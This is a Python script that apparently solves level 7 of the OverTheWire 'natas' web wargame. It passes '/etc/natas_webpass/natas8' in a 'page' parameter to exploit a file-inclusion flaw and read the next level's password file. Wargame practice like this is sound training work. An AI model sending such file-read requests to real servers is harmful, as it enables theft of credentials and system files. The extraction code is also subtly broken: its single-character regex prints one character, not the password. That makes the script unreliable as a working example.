import re
import requests
from requests.auth import HTTPBasicAuth
import natas6solution

auth = HTTPBasicAuth('natas7', natas6solution.get_pass())
def get_pass():
    param = {'page':'/etc/natas_webpass/natas8'}
    r = requests.get('http://natas7.natas.labs.overthewire.org/', auth=auth,params=param)
    pass_regex = '[a-zA-Z0-9]'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == "__main__":
    get_pass()
